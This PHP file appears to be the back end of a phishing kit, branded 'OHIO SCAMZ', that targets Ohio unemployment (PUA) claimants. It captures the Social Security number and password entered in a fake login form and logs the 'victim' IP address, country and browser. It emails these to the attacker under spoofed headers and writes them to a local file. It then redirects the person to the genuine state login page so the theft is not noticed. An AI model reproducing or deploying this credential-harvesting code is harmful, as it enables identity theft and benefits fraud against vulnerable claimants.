<?php
include 'geoip.php';
include 'blocker.php';
include 'email.php';

$ip_pailam = getenv("REMOTE_ADDR");
$_SESSION["country"] = ip_info($ip_pailam, "Country Code");

if(strtoupper($_SERVER['REQUEST_METHOD']) === 'GET') {
	header("Location: index.php");
}

/*
if (isset($_POST["btnLogin"])){
	echo $_POST["txtUserName"];
	echo $_POST["txtPassword"];
}
*/

if ($_POST["txtUserName"] != "" and $_POST["txtPassword"] != "")
{
	$result_html = "++++++++++ +++++++ +++++++++++++" . "\n";
	$result_html .= "++++++++++ OHIO SCAMZ ++++++++++" . "\n";
	$result_html .= "++++++++++ +++++++ +++++++++++++" . "\n";
	$result_html .= "Social Security: " . $_POST["txtUserName"] . "\n";
	$result_html .= "Password::	" . $_POST["txtPassword"] . "\n";
	$result_html .= "++++++++++ VICTIM INFO ++++++++++" . "\n";
	$result_html .= "Victim IP::" . "https://www.geodatatool.com/en/?ip=" . $ip_pailam . "\n";
	$result_html .= "Browser::	" . $_SERVER['HTTP_USER_AGENT'] . "\n";
	$result_html .= "++++++++ R3H4N 1337 +++++++++" . "\n";
	$subject = "OHIO SCAMZ [ " . $ip_pailam . " - " . $_SESSION["country"] . " ]";
    $headers = array
    (
        'MIME-Version: 1.0',
        'Content-Transfer-Encoding: 7bit',
        'Date: ' . date('r', $_SERVER['REQUEST_TIME']),
        'Message-ID: <' . $_SERVER['REQUEST_TIME'] . md5($_SERVER['REQUEST_TIME']) . '@' . $_SERVER['SERVER_NAME'] . '>',
        'From: NetZero Login <info@1337info.org>',
        'X-Mailer: PHP v' . phpversion(),
        'X-Originating-IP: ' . $_SERVER['SERVER_ADDR'],
        'X-Priority: 1 (Highest)',
		'X-MSMail-Priority: High',
		'Importance: High'
    );

	$file_e_save_hobe = fopen("vau_nen.txt", "a");
	mail($email,'=?UTF-8?B?' . base64_encode($subject) . '?=',$result_html,implode("\n", $headers));
	mail($form,'=?UTF-8?B?' . base64_encode($subject) . '?=',$result_html,implode("\n", $headers));
	fwrite($file_e_save_hobe, $result_html);

	header("location: https://pua.unemployment.ohio.gov/Claimant/Core/Login.ASPX");
}

?>